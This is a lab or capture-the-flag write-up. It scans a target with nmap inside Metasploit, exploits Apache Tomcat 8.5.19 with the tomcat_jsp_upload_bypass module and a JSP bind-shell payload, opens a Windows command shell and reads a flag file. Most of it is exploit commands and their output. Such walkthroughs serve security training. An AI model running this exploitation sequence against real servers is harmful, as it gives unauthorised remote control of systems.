# Exploiting A Vulnerable Apache Tomcat Web Server

`Apache Tomcat`\
\- Also known as **Tomcat Server**\
\- It is used to build and host dynamic websites and web applications based on the Java software platform.\
\- Utilize the HTTP protocol to facilitate the underlying communicaiton between the server and clients./
\- Runs on TCP port 8080 by default

### Lab Practice
```bash
# Start Metasploit
# Set target IP as grobal RHOSTS
msf6 > db_nmap -sS -sV -O 10.0.30.204
[*] Nmap: Nmap scan report for demo.ine.local (10.0.30.204)
[*] Nmap: Host is up (0.0033s latency).
[*] Nmap: Not shown: 990 closed tcp ports (reset)
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 8009/tcp  open  ajp13              Apache Jserv (Protocol v1.3)
[*] Nmap: 8080/tcp  open  http               Apache Tomcat 8.5.19     <- Apache Tomcat
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC

# "services" command also shows list of services running on the target
msf6 > services
Services
========

host        port   proto  name            state  info
----        ----   -----  ----            -----  ----
10.0.30.20  135    tcp    msrpc           open   Microsoft Windows RPC
4
10.0.30.20  139    tcp    netbios-ssn     open   Microsoft Windows netbi
4                                                os-ssn
10.0.30.20  445    tcp    microsoft-ds    open   Microsoft Windows Serve
4                                                r 2008 R2 - 2012 micros
                                                 oft-ds
10.0.30.20  3389   tcp    ssl/ms-wbt-ser  open
4                         ver
10.0.30.20  8009   tcp    ajp13           open   Apache Jserv Protocol v
4                                                1.3
10.0.30.20  8080   tcp    http            open   Apache Tomcat 8.5.19
4
10.0.30.20  49152  tcp    msrpc           open   Microsoft Windows RPC
4
10.0.30.20  49153  tcp    msrpc           open   Microsoft Windows RPC
4
10.0.30.20  49154  tcp    msrpc           open   Microsoft Windows RPC
4
10.0.30.20  49155  tcp    msrpc           open   Microsoft Windows RPC
4
```

```bash
# Find exploit module
# Better to search tomcat_jsp
msf6 > search type:exploit tomcat 
msf6 > use exploit/multi/http/tomcat_jsp_upload_bypass
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set payload java/jsp_shell_bind_tcp
payload => java/jsp_shell_bind_tcp
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set RHOST 10.0.30.204
RHOST => 10.0.30.204

# Run module
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > run

[*] Uploading payload...
[*] Payload executed!
[*] Started bind TCP handler against 10.0.30.204:4444
[*] Command shell session 1 opened (10.10.38.2:40001 -> 10.0.30.204:4444) at 2025-07-24 07:44:44 +0530

Shell Banner:
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 8.5>
-----
          

C:\Program Files\Apache Software Foundation\Tomcat 8.5>
```

```bash
# Naviagate to C:\
C:\>type flag.txt
type flag.txt
92d60a06d0ea2179c9a8c442c0bd0bc0
```
